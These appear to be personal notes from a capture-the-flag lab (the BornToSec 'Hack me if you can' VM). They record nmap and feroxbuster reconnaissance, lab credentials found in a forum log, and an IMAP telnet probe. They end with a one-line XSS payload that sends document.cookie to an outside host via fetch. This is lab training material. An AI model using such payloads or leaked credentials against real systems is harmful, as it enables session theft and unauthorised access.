![[Pasted image 20240417170443.png]]
![[Pasted image 20240417170507.png]]
![[Pasted image 20240417170537.png]]






I launched the machine and made a scan on my local network:
```
┌──(fab㉿kali)-[~]
└─$ nmap 192.168.56.3/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 16:50 CEST
Nmap scan report for DESKTOP-D3V2624 (192.168.56.1)
Host is up (0.56s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 192.168.56.101
Host is up (0.0097s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 5.31 seconds

┌──(fab㉿kali)-[~]
└─$
```
and discovered this IP:
![[Pasted image 20240417165322.png]]
```
┌──(fab㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:09 CEST
Nmap scan report for 192.168.56.101
Host is up (0.0024s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2024-04-17T15:09:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: SASL-IR Pre-login more have LITERAL+ OK listed STARTTLS capabilities post-login LOGINDISABLEDA0001 IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: SASL-IR Pre-login more LITERAL+ have capabilities AUTH=PLAINA0001 listed post-login OK IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE
|_ssl-date: 2024-04-17T15:09:34+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.27 seconds

┌──(fab㉿kali)-[~]
└─$ feroxbuster -u https://192.168.56.101 -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowerca
se.txt -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://192.168.56.101
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c https://192.168.56.101/forum => https://192.168.56.101/forum/
301      GET        9l       28w      323c https://192.168.56.101/phpmyadmin => https://192.168.56.101/phpmyadmin/
301      GET        9l       28w      320c https://192.168.56.101/webmail => https://192.168.56.101/webmail/
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      328c https://192.168.56.101/webmail/plugins => https://192.168.56.101/webmail/plugins/
301      GET        9l       28w      327c https://192.168.56.101/webmail/themes => https://192.168.56.101/webmail/themes/
301      GET        9l       28w      327c https://192.168.56.101/webmail/images => https://192.168.56.101/webmail/images/
301      GET        9l       28w      327c https://192.168.56.101/webmail/config => https://192.168.56.101/webmail/config/
301      GET        9l       28w      325c https://192.168.56.101/forum/images => https://192.168.56.101/forum/images/
301      GET        9l       28w      321c https://192.168.56.101/forum/js => https://192.168.56.101/forum/js/
301      GET        9l       28w      327c https://192.168.56.101/forum/includes => https://192.168.56.101/forum/includes/
301      GET        9l       28w      326c https://192.168.56.101/forum/modules => https://192.168.56.101/forum/modules/
301      GET        9l       28w      325c https://192.168.56.101/forum/themes => https://192.168.56.101/forum/themes/
200      GET        1l       90w     4450c https://192.168.56.101/forum/js/admin.min.js
200      GET        1l      191w    14244c https://192.168.56.101/forum/js/posting.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/rss.inc.php => ../index.php
200      GET      315l     1031w     9970c https://192.168.56.101/forum/js/admin.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/avatar.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/account_locked.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/js_defaults.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/register.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/main.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/auto_login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/user.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/contact.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/entry.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/posting.inc.php => ../index.php
200      GET        3l      321w    22481c https://192.168.56.101/forum/js/main.min.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/delete_cookie.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/index.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/disabled.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/insert_flash.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/login.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/upload_image.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/thread.inc.php => ../index.php
200      GET      812l     2589w    26535c https://192.168.56.101/forum/js/posting.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/functions.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/page.inc.php => ../index.php
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/admin.inc.php => ../index.php
200      GET     1474l     4831w    45512c https://192.168.56.101/forum/js/main.js
302      GET        0l        0w        0c https://192.168.56.101/forum/includes/search.inc.php => ../index.php
301      GET        9l       28w      342c https://192.168.56.101/webmail/plugins/administrator => https://192.168.56.101/webmail/plugins/administrator/
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/test => https://192.168.56.101/webmail/plugins/test/
301      GET        9l       28w      331c https://192.168.56.101/webmail/themes/css => https://192.168.56.101/webmail/themes/css/
301      GET        9l       28w      330c https://192.168.56.101/phpmyadmin/themes => https://192.168.56.101/phpmyadmin/themes/
301      GET        9l       28w      326c https://192.168.56.101/phpmyadmin/js => https://192.168.56.101/phpmyadmin/js/
200      GET        6l       15w      382c https://192.168.56.101/forum/images/smilies/biggrin.png
200      GET        4l       10w      325c https://192.168.56.101/forum/images/smilies/tongue.png
200      GET        4l       12w      303c https://192.168.56.101/forum/images/smilies/wink.png
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/smile.png
200      GET        3l        8w      292c https://192.168.56.101/forum/images/smilies/frown.png
200      GET        0l        0w        0c https://192.168.56.101/forum/includes/classes/Backup.class.php
200      GET        3l        9w      303c https://192.168.56.101/forum/images/smilies/neutral.png
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/akismet/akismet.class.php
200      GET        3l        6w      122c https://192.168.56.101/forum/modules/captcha/captcha_image.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser.class.php
200      GET       93l      281w     5742c https://192.168.56.101/forum/themes/default/main.tpl
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/bad-behavior/bad-behavior-generic.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/captcha/captcha.php
200      GET       22l       49w     1388c https://192.168.56.101/forum/themes/default/rss.tpl
200      GET        1l        6w       45c https://192.168.56.101/forum/modules/bad-behavior/index.html
200      GET       63l      262w     3176c https://192.168.56.101/forum/themes/default/insert_flash.tpl
200      GET        7l       16w      256c https://192.168.56.101/forum/themes/default/ajax_preview.tpl
200      GET      139l      506w     7201c https://192.168.56.101/forum/themes/default/upload_image.tpl
200      GET       87l      318w     4450c https://192.168.56.101/forum/themes/default/avatar.tpl
301      GET        9l       28w      323c https://192.168.56.101/forum/lang => https://192.168.56.101/forum/lang/
200      GET       21l       63w      955c https://192.168.56.101/forum/themes/default/js_config.ini
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/stringparser_bbcode/stringparser_bbcode.class.php
301      GET        9l       28w      330c https://192.168.56.101/forum/templates_c => https://192.168.56.101/forum/templates_c/
200      GET      403l     1325w    28929c https://192.168.56.101/forum/themes/default/style.min.css
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/geshi/geshi.php
200      GET        0l        0w        0c https://192.168.56.101/forum/modules/smarty/Smarty.class.php
200      GET      600l     3494w    37414c https://192.168.56.101/forum/themes/default/style.css
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
200      GET     1106l     3513w    58607c https://192.168.56.101/forum/lang/chinese.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
200      GET        0l        0w        0c https://192.168.56.101/forum/templates_c/8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
200      GET     1105l     7187w    68480c https://192.168.56.101/forum/lang/spanish.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/demo => https://192.168.56.101/webmail/plugins/demo/
200      GET     1104l     6975w    69761c https://192.168.56.101/forum/lang/italian.lang
301      GET        9l       28w      333c https://192.168.56.101/webmail/plugins/info => https://192.168.56.101/webmail/plugins/info/
200      GET     1106l     6152w    68103c https://192.168.56.101/forum/lang/german.lang
200      GET     1114l     6827w    64755c https://192.168.56.101/forum/lang/english.lang
200      GET     1103l     6604w    66692c https://192.168.56.101/forum/lang/norwegian.lang
200      GET     1106l     7670w    73677c https://192.168.56.101/forum/lang/french.lang
200      GET     1115l     6226w    65855c https://192.168.56.101/forum/lang/swedish.lang
200      GET        1l        4w       24c https://192.168.56.101/forum/templates_c/11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
200      GET     1104l     6396w    66784c https://192.168.56.101/forum/lang/croatian.lang
200      GET     1117l     6551w    96868c https://192.168.56.101/forum/lang/russian.lang
200      GET     1101l     6130w   123515c https://192.168.56.101/forum/lang/tamil.lang
301      GET        9l       28w      337c https://192.168.56.101/webmail/plugins/calendar => https://192.168.56.101/webmail/plugins/calendar/
200      GET     1109l     6168w    69500c https://192.168.56.101/forum/lang/turkish.lang
200      GET        1l        8w      374c https://192.168.56.101/forum/themes/default/images/favicon.ico
200      GET        3l        8w      245c https://192.168.56.101/forum/themes/default/images/complete_thread.png
200      GET       80l      371w     4935c https://192.168.56.101/forum/index
301      GET        9l       28w      325c https://192.168.56.101/forum/update => https://192.168.56.101/forum/update/
301      GET        9l       28w      324c https://192.168.56.101/webmail/src => https://192.168.56.101/webmail/src/
401      GET       14l       56w      482c https://192.168.56.101/phpmyadmin/setup
<SNIP>

┌──(fab㉿kali)-[~]
└─$
```
![[Pasted image 20240418113308.png]]
![[Pasted image 20240418100144.png]]
![[Pasted image 20240418113138.png]]

In the forum, by scrolling the ["Probleme login ?"](https://192.168.56.101/forum/index.php?id=6) room, we can see a user making many a connection attempt until they can log as "lmezard": 
![[Pasted image 20240418113422.png]]
![[Pasted image 20240418113755.png]]
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

With the following credentials:
```
lmezard
!q\]Ej?*5K5cy*AJ
```
I could accede to the forum:
![[Pasted image 20240418125614.png]]
If I explore the "Users" tab:
![[Pasted image 20240418135915.png]]
![[Pasted image 20240418135818.png]]
![[Pasted image 20240418135846.png]]













[IMAP commands](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet)
[commands](https://www.atmail.com/blog/imap-commands)
[Hacking IMAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap):
```
┌──(fab㉿kali)-[~]
└─$ telnet 192.168.56.101 143
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE STARTTLS LOGINDISABLED] Dovecot ready.

```

```
<img src="http://192.168.119.135" onerror=fetch('http://192.168.119.135/'+document.cookie);>
```
